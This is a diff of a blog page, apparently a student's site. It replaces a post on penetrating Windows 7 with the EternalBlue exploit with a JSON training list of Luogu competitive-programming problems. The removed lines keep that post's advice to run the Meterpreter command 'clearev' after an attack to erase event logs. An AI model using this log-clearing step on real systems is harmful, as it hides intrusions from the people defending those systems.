+        &quot;description&quot;: &quot;普及练习场的大BOSS：“一定让你有去无回”。怎么办呢？只能打倒他开启下一个级别！&quot;,
+        &quot;problems&quot;: [&quot;P1328&quot;, &quot;P1062&quot;, &quot;P1969&quot;, &quot;P1037&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;普及常见模板&quot;,
+        &quot;description&quot;: &quot;这里集中了比较基础的算法的模板。提高和省选也有模板题哦！&quot;,
+        &quot;problems&quot;: [&quot;P1177&quot;, &quot;P3366&quot;, &quot;P3367&quot;, &quot;P3371&quot;, &quot;P3383&quot;]
+      }
+    ]
+  },
+  {
+    &quot;name&quot;: &quot;提高历练地&quot;,
+    &quot;description&quot;: &quot;已经去除了普及组难度的，请组织放心。成长大牛之必写题！！！&quot;,
+    &quot;subtasks&quot;: [
+      {
+        &quot;name&quot;: &quot;搜索Ex&quot;,
+        &quot;description&quot;: &quot;开始提高组的试炼。这里已经去除了所有普及组难度的题目。哼哼，怕了吧。。&quot;,
+        &quot;problems&quot;: [&quot;P1120&quot;, &quot;P1378&quot;, &quot;P1514&quot;, &quot;P1312&quot;, &quot;P1441&quot;, &quot;P1242&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划TG.lv(1)&quot;,
+        &quot;description&quot;: &quot;这是提高组难度中比较基础的动态规划，也许一两个转移方程就可以写出。&quot;,
+        &quot;problems&quot;: [&quot;P1005&quot;, &quot;P1373&quot;, &quot;P2279&quot;, &quot;P1220&quot;, &quot;P1156&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划TG.lv(2)&quot;,
+        &quot;description&quot;: &quot;这里的动态规划稍稍有所加大难度，思考转移方程的时间可能会与编写程序的时间持平。&quot;,
+        &quot;problems&quot;: [&quot;P1273&quot;, &quot;P1169&quot;, &quot;P2577&quot;, &quot;P1070&quot;, &quot;P2051&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划TG.lv(3)&quot;,
+        &quot;description&quot;: &quot;比较需要技巧的动态规划。有的不仅仅需要状态转移方程，可能还会与别的算法综合。&quot;,
+        &quot;problems&quot;: [&quot;P1415&quot;, &quot;P2157&quot;, &quot;P2216&quot;, &quot;P2331&quot;, &quot;P2467&quot;, &quot;P3084&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;数论&quot;,
+        &quot;description&quot;: &quot;数论就是研究整数的理论。包括公约公倍数、质数、欧拉定理和同余方程等。&quot;,
+        &quot;problems&quot;: [&quot;P2152&quot;, &quot;P1414&quot;, &quot;P1134&quot;, &quot;P1313&quot;, &quot;P1306&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;博弈论&quot;,
+        &quot;description&quot;: &quot;博弈论考虑游戏中的个体的预测行为和实际行为，并研究它们的优化策略。&quot;,
+        &quot;problems&quot;: [&quot;P1199&quot;, &quot;P1288&quot;, &quot;P1290&quot;, &quot;P2148&quot;, &quot;P1247&quot;, &quot;P2575&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;其他数学问题&quot;,
+        &quot;description&quot;: &quot;听说学oi的同志们数学都挺好。那么。就请完成下面的题目证明这一点吧！&quot;,
+        &quot;problems&quot;: [&quot;P1357&quot;, &quot;P1641&quot;, &quot;P2059&quot;, &quot;P2154&quot;, &quot;P2261&quot;, &quot;P2327&quot;, &quot;P1066&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;图的遍历&quot;,
+        &quot;description&quot;: &quot;图是一种非常重要的数据结构，描述对象复杂的练习。这里开始接触图的基本概念。&quot;,
+        &quot;problems&quot;: [&quot;P2661&quot;, &quot;P1330&quot;, &quot;P1341&quot;, &quot;P2921&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;最短路问题&quot;,
+        &quot;description&quot;: &quot;最短路是图论中最重要的部分，多种算法可以应用。很多题目都可以抽象成这种模型。&quot;,
+        &quot;problems&quot;: [&quot;P1339&quot;, &quot;P1462&quot;, &quot;P1346&quot;, &quot;P1119&quot;, &quot;P1144&quot;, &quot;P1522&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;最小生成树&quot;,
+        &quot;description&quot;: &quot;最小生成树可以用kruskal（克鲁斯卡尔）算法或prim（普里姆）算法求出。&quot;,
+        &quot;problems&quot;: [&quot;P1546&quot;, &quot;P2330&quot;, &quot;P1991&quot;, &quot;P1265&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;较复杂图论I&quot;,
+        &quot;description&quot;: &quot;别的些图论问题，包括树、拓扑排序等。要过这一关，需要学习不少新的算法。&quot;,
+        &quot;problems&quot;: [&quot;P1113&quot;, &quot;P1268&quot;, &quot;P1525&quot;, &quot;P1983&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;较复杂图论II&quot;,
+        &quot;description&quot;: &quot;更高级的图论算法。包括差分约束、强连通、二分图等。会更难一些。&quot;,
+        &quot;problems&quot;: [&quot;P1993&quot;, &quot;P1726&quot;, &quot;P2055&quot;, &quot;P2149&quot;, &quot;P1345&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;并查集&quot;,
+        &quot;description&quot;: &quot;用于处理一些不相交集合的合并及查询问题。常常在使用中以森林来表示。&quot;,
+        &quot;problems&quot;: [&quot;P1111&quot;, &quot;P2024&quot;, &quot;P1197&quot;, &quot;P1196&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;堆&quot;,
+        &quot;description&quot;: &quot;堆总是一棵完全树；堆中某个节点的值总是不大于或不小于其父节点的值。&quot;,
+        &quot;problems&quot;: [&quot;P1801&quot;, &quot;P2278&quot;, &quot;P1631&quot;, &quot;P2085&quot;, &quot;P1484&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;线段树树状数组基础&quot;,
+        &quot;description&quot;: &quot;这都是比较高级的线性数据结构。在处理一些询问与修改线性问题时，是很好用的。&quot;,
+        &quot;problems&quot;: [&quot;P1972&quot;, &quot;P1198&quot;, &quot;P2023&quot;, &quot;P2161&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;神奇的解法&quot;,
+        &quot;description&quot;: &quot;有些问题刚开始觉得无从下手。好好想一想，尽量别看题解，否则你会大呼“简单”。&quot;,
+        &quot;problems&quot;: [&quot;P1007&quot;, &quot;P1984&quot;, &quot;P2022&quot;, &quot;P2320&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;倍增&quot;,
+        &quot;description&quot;: &quot;一种特殊的枚举算法，但可大大加快效率。近年noip有考到。难度较大。&quot;,
+        &quot;problems&quot;: [&quot;P1967&quot;, &quot;P1081&quot;, &quot;P1613&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;强连通分量&quot;,
+        &quot;description&quot;: &quot;强连通分量&quot;,
+        &quot;problems&quot;: [&quot;P2341&quot;, &quot;P3469&quot;, &quot;P2746&quot;, &quot;P3119&quot;, &quot;P3225&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-提高综合练习1&quot;,
+        &quot;description&quot;: &quot;年轻人，又是个送上门的，让我来看看你真实的本领。啊哈哈哈哈哈！&quot;,
+        &quot;problems&quot;: [&quot;P2264&quot;, &quot;P1772&quot;, &quot;P1083&quot;, &quot;P1979&quot;, &quot;P2939&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-提高综合练习2&quot;,
+        &quot;description&quot;: &quot;再来！这里有的题目并非单纯的考察某个算法，而是考察一种综合性的思维。&quot;,
+        &quot;problems&quot;: [&quot;P1901&quot;, &quot;P1314&quot;, &quot;P2144&quot;, &quot;P1073&quot;, &quot;P2324&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;BOSS战-提高综合练习3&quot;,
+        &quot;description&quot;: &quot;既然已经打倒了前面2个boss，那么第3个也是没有问题的。少年，来吧！&quot;,
+        &quot;problems&quot;: [&quot;P1965&quot;, &quot;P1311&quot;, &quot;P2296&quot;, &quot;P1084&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;提高模板-nlogn数据结构&quot;,
+        &quot;description&quot;: &quot;虽然这些算法不是noip必须的，但是不算困难，很多题目可以使用这些方法。&quot;,
+        &quot;problems&quot;: [&quot;P3374&quot;, &quot;P3368&quot;, &quot;P3372&quot;, &quot;P3373&quot;, &quot;P1439&quot;, &quot;P3378&quot;]
+      }
+    ]
+  },
+  {
+    &quot;name&quot;: &quot;省选斗兽场/NOI神殿&quot;,
+    &quot;description&quot;: &quot;为省选及以上选手制作的训练场。其实，省选水平的oier不需要一些外加的刷题列表，本栏仅供参考，也欢迎各位指出不足。&quot;,
+    &quot;subtasks&quot;: [
+      {
+        &quot;name&quot;: &quot;省选基础-读入/输出优化&quot;,
+        &quot;description&quot;: &quot;读入/输出优化是省选刷题时必要的一个东西，这里给出了几题，需要自己手写相应的读入输出处理。作为第一关，这一关相对简单。&quot;,
+        &quot;problems&quot;: [&quot;P1580&quot;, &quot;P2393&quot;, &quot;P2394&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;省选基础-位运算&quot;,
+        &quot;description&quot;: &quot;位运算往往在必要的时候,能带你优化一下常数,也许是空间;也许是时间;有的时候这样可以多过很多分&quot;,
+        &quot;problems&quot;: [&quot;P2114&quot;, &quot;P2396&quot;, &quot;P2397&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;省选基础-打表&quot;,
+        &quot;description&quot;: &quot;打表虽然很赖皮,而且基本都是非正解,但是这种办法能让我们在省选中拿到一些会超时或者会超空间的一些数据点&quot;,
+        &quot;problems&quot;: [&quot;P1149&quot;, &quot;P1463&quot;, &quot;P1896&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划1&quot;,
+        &quot;description&quot;: &quot;动态规划&quot;,
+        &quot;problems&quot;: [&quot;P2051&quot;, &quot;P1879&quot;, &quot;P1850&quot;, &quot;P2831&quot;, &quot;P1131&quot;, &quot;P1169&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态规划2&quot;,
+        &quot;description&quot;: &quot;动态规划&quot;,
+        &quot;problems&quot;: [&quot;P1273&quot;, &quot;P3648&quot;, &quot;P2519&quot;, &quot;P2515&quot;, &quot;P3233&quot;, &quot;P2501&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;网络流——最大流&quot;,
+        &quot;description&quot;: &quot;最大流&quot;,
+        &quot;problems&quot;: [&quot;P2765&quot;, &quot;P2764&quot;, &quot;P2763&quot;, &quot;P2766&quot;, &quot;P2774&quot;, &quot;P2805&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;网络流——费用流&quot;,
+        &quot;description&quot;: &quot;费用流&quot;,
+        &quot;problems&quot;: [&quot;P2153&quot;, &quot;P2053&quot;, &quot;P3159&quot;, &quot;P2604&quot;, &quot;P2050&quot;, &quot;P3980&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;单调队列&quot;,
+        &quot;description&quot;: &quot;单调队列&quot;,
+        &quot;problems&quot;: [&quot;P2698&quot;, &quot;P2216&quot;, &quot;P2219&quot;, &quot;P2564&quot;, &quot;P2569&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;概率期望&quot;,
+        &quot;description&quot;: &quot;概率期望&quot;,
+        &quot;problems&quot;: [&quot;P2473&quot;, &quot;P2221&quot;, &quot;P3317&quot;, &quot;P3343&quot;, &quot;P3600&quot;, &quot;P3830&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;二分图&quot;,
+        &quot;description&quot;: &quot;二分图&quot;,
+        &quot;problems&quot;: [&quot;P3386&quot;, &quot;P1640&quot;, &quot;P1129&quot;, &quot;P1963&quot;, &quot;P3231&quot;, &quot;P2526&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;点分治&quot;,
+        &quot;description&quot;: &quot;点分治&quot;,
+        &quot;problems&quot;: [&quot;P2634&quot;, &quot;P2664&quot;, &quot;P3806&quot;, &quot;P3676&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;后缀数组&quot;,
+        &quot;description&quot;: &quot;后缀数组&quot;,
+        &quot;problems&quot;: [&quot;P3809&quot;, &quot;P1117&quot;, &quot;P2178&quot;, &quot;P2463&quot;, &quot;P2336&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;主席树&quot;,
+        &quot;description&quot;: &quot;主席树&quot;,
+        &quot;problems&quot;: [&quot;P2468&quot;, &quot;P3157&quot;, &quot;P3302&quot;, &quot;P3168&quot;, &quot;P3313&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;数位DP&quot;,
+        &quot;description&quot;: &quot;数位DP&quot;,
+        &quot;problems&quot;: [&quot;P2602&quot;, &quot;P3281&quot;, &quot;P2518&quot;, &quot;P2606&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;AC自动机&quot;,
+        &quot;description&quot;: &quot;AC自动机&quot;,
+        &quot;problems&quot;: [&quot;P3808&quot;, &quot;P3796&quot;, &quot;P2444&quot;, &quot;P2414&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;平衡树&quot;,
+        &quot;description&quot;: &quot;平衡树&quot;,
+        &quot;problems&quot;: [&quot;P2042&quot;, &quot;P2596&quot;, &quot;P1110&quot;, &quot;P3285&quot;, &quot;P3644&quot;, &quot;P3765&quot;, &quot;P3369&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;树链剖分&quot;,
+        &quot;description&quot;: &quot;树链剖分&quot;,
+        &quot;problems&quot;: [&quot;P2590&quot;, &quot;P2486&quot;, &quot;P2146&quot;, &quot;P3258&quot;, &quot;P3178&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;动态树&quot;,
+        &quot;description&quot;: &quot;动态树&quot;,
+        &quot;problems&quot;: [&quot;P3690&quot;, &quot;P2387&quot;, &quot;P3203&quot;, &quot;P3348&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;树套树&quot;,
+        &quot;description&quot;: &quot;树套树&quot;,
+        &quot;problems&quot;: [&quot;P1903&quot;, &quot;P3157&quot;, &quot;P3332&quot;, &quot;P2166&quot;, &quot;P3380&quot;, &quot;P2137&quot;, &quot;P3759&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;可持久化Trie树&quot;,
+        &quot;description&quot;: &quot;可持久化Trie树&quot;,
+        &quot;problems&quot;: [&quot;P2048&quot;, &quot;P3527&quot;, &quot;P3302&quot;, &quot;P3168&quot;, &quot;P3242&quot;, &quot;P3241&quot;, &quot;P3293&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;莫队算法&quot;,
+        &quot;description&quot;: &quot;莫队算法&quot;,
+        &quot;problems&quot;: [&quot;P1972&quot;, &quot;P2336&quot;, &quot;P3709&quot;, &quot;P2709&quot;, &quot;P3674&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;分块&quot;,
+        &quot;description&quot;: &quot;分块&quot;,
+        &quot;problems&quot;: [&quot;P1972&quot;, &quot;P3396&quot;, &quot;P1822&quot;, &quot;P2801&quot;, &quot;P3203&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;莫比乌斯反演&quot;,
+        &quot;description&quot;: &quot;莫比乌斯反演&quot;,
+        &quot;problems&quot;: [&quot;P3768&quot;, &quot;P3172&quot;, &quot;P3455&quot;, &quot;P2522&quot;, &quot;P3327&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;其他&quot;,
+        &quot;description&quot;: &quot;其他&quot;,
+        &quot;problems&quot;: [&quot;P3377&quot;, &quot;P3261&quot;, &quot;P3382&quot;, &quot;P2571&quot;, &quot;P3222&quot;, &quot;P3187&quot;, &quot;P3199&quot;, &quot;P3292&quot;, &quot;P2824&quot;, &quot;P3285&quot;, &quot;P1552&quot;]
+      }
+    ]
+  },
+  {
+    &quot;name&quot;: &quot;USACO&quot;,
+    &quot;description&quot;: &quot;美国经典的算法练习题库，值得一刷&quot;,
+    &quot;subtasks&quot;: [
+      {
+        &quot;name&quot;: &quot;USACO Section 1.1&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1200&quot;, &quot;P1201&quot;, &quot;P1202&quot;, &quot;P1203&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 1.2&quot;,
+        &quot;description&quot;: &quot;完全枚举&quot;,
+        &quot;problems&quot;: [&quot;P3864&quot;, &quot;P1204&quot;, &quot;P1205&quot;, &quot;P1206&quot;, &quot;P1207&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 1.3&quot;,
+        &quot;description&quot;: &quot;贪心&quot;,
+        &quot;problems&quot;: [&quot;P1208&quot;, &quot;P1209&quot;, &quot;P1211&quot;, &quot;P1444&quot;, &quot;P3650&quot;, &quot;P2693&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 1.4&quot;,
+        &quot;description&quot;: &quot;有技巧的枚举&quot;,
+        &quot;problems&quot;: [&quot;P1214&quot;, &quot;P1215&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 1.5&quot;,
+        &quot;description&quot;: &quot;二进制数&quot;,
+        &quot;problems&quot;: [&quot;P1216&quot;, &quot;P1217&quot;, &quot;P1218&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 2.1&quot;,
+        &quot;description&quot;: &quot;图论和洪水填充&quot;,
+        &quot;problems&quot;: [&quot;P1457&quot;, &quot;P1458&quot;, &quot;P1459&quot;, &quot;P1460&quot;, &quot;P1461&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 2.2&quot;,
+        &quot;description&quot;: &quot;数据结构与动态规划&quot;,
+        &quot;problems&quot;: [&quot;P1465&quot;, &quot;P1466&quot;, &quot;P1467&quot;, &quot;P1468&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 2.3&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1470&quot;, &quot;P1472&quot;, &quot;P1473&quot;, &quot;P1474&quot;, &quot;P1475&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 2.4&quot;,
+        &quot;description&quot;: &quot;最短路径&quot;,
+        &quot;problems&quot;: [&quot;P1518&quot;, &quot;P1519&quot;, &quot;P1522&quot;, &quot;P1529&quot;, &quot;P1530&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 3.1&quot;,
+        &quot;description&quot;: &quot;最小生成树&quot;,
+        &quot;problems&quot;: [&quot;P1546&quot;, &quot;P2722&quot;, &quot;P2723&quot;, &quot;P2724&quot;, &quot;P2725&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 3.2&quot;,
+        &quot;description&quot;: &quot;背包问题&quot;,
+        &quot;problems&quot;: [&quot;P1134&quot;, &quot;P2727&quot;, &quot;P2728&quot;, &quot;P2729&quot;, &quot;P2730&quot;, &quot;P1828&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 3.3&quot;,
+        &quot;description&quot;: &quot;欧拉回路&quot;,
+        &quot;problems&quot;: [&quot;P2731&quot;, &quot;P2732&quot;, &quot;P1930&quot;, &quot;P2733&quot;, &quot;P2734&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 3.4&quot;,
+        &quot;description&quot;: &quot;计算几何&quot;,
+        &quot;problems&quot;: [&quot;P1827&quot;, &quot;P2735&quot;, &quot;P2736&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 4.1&quot;,
+        &quot;description&quot;: &quot;最优化&quot;,
+        &quot;problems&quot;: [&quot;P2737&quot;, &quot;P2738&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 4.2&quot;,
+        &quot;description&quot;: &quot;网络流&quot;,
+        &quot;problems&quot;: [&quot;P2740&quot;, &quot;P1894&quot;, &quot;P2751&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 4.3&quot;,
+        &quot;description&quot;: &quot;高精度&quot;,
+        &quot;problems&quot;: [&quot;P2687&quot;, &quot;P2752&quot;, &quot;P2753&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 4.4&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1344&quot;, &quot;P2739&quot;, &quot;P2741&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 5.1&quot;,
+        &quot;description&quot;: &quot;二维凸包&quot;,
+        &quot;problems&quot;: [&quot;P2742&quot;, &quot;P2743&quot;, &quot;P2749&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 5.2&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1560&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 5.3&quot;,
+        &quot;description&quot;: &quot;启发式搜索&quot;,
+        &quot;problems&quot;: [&quot;P2701&quot;, &quot;P2744&quot;, &quot;P2745&quot;, &quot;P2746&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 5.4&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1345&quot;, &quot;P2747&quot;, &quot;P2748&quot;]
+      },
+      {
+        &quot;name&quot;: &quot;USACO Section 5.5&quot;,
+        &quot;description&quot;: &quot;&quot;,
+        &quot;problems&quot;: [&quot;P1709&quot;, &quot;P1856&quot;, &quot;P2750&quot;]
+      }
+    ]
+  }
+]
 </code></pre>
-<p>建议在结束攻击后运行 <code>clearev</code> 。</p>
-<hr>
-<p>演示到这里就结束了，有没有感觉即惊讶又害怕？</p>
-<p>如何避免该漏洞：开防火墙，多打补丁。做了这些，你就不用怕中招。</p>
 
             </div>
             
@@ -450,7 +2121,7 @@ clearev                       #清除日志
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://zxh23682.github.io/post/li-yong-yong-heng-zhi-lan-lou-dong-jin-xing-win7-shen-tou-de-yan-shi/" title="利用“永恒之蓝”漏洞进行Win7渗透的演示">https://zxh23682.github.io/post/li-yong-yong-heng-zhi-lan-lou-dong-jin-xing-win7-shen-tou-de-yan-shi/</a>
+      <a href="https://zxh23682.github.io/post/shi-lian-chang/" title="【置顶】试炼场">https://zxh23682.github.io/post/shi-lian-chang/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -466,14 +2137,14 @@ clearev                       #清除日志
     <div class="nav-prev">
       
         <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="题解 P6850 【NOI】" href="https://zxh23682.github.io/post/ti-jie-p6850-noi/">题解 P6850 【NOI】</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="题解 P6850 【NOI】" href="https://zxh23682.github.io/post/ti-jie-p6850-noi/">上一篇</a>
+        <a class="nav-pc-next" title="题解 CF1453A 【Cancel the Trains】" href="https://zxh23682.github.io/post/ti-jie-cf1453a-cancel-the-trains/">题解 CF1453A 【Cancel the Trains】</a class="nav-pc-next">
+        <a class="nav-mobile-prev" title="题解 CF1453A 【Cancel the Trains】" href="https://zxh23682.github.io/post/ti-jie-cf1453a-cancel-the-trains/">上一篇</a>
       
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="华育中学第22届运动会游记" href="https://zxh23682.github.io/post/hua-yu-zhong-xue-di-22-jie-yun-dong-hui-you-ji/">华育中学第22届运动会游记</a>
-        <a class="nav-mobile-next" title="华育中学第22届运动会游记" href="https://zxh23682.github.io/post/hua-yu-zhong-xue-di-22-jie-yun-dong-hui-you-ji/">下一篇</a>
+        <a class="nav-pc-next" title="OI in 2020" href="https://zxh23682.github.io/post/oi-in-2020/">OI in 2020</a>
+        <a class="nav-mobile-next" title="OI in 2020" href="https://zxh23682.github.io/post/oi-in-2020/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
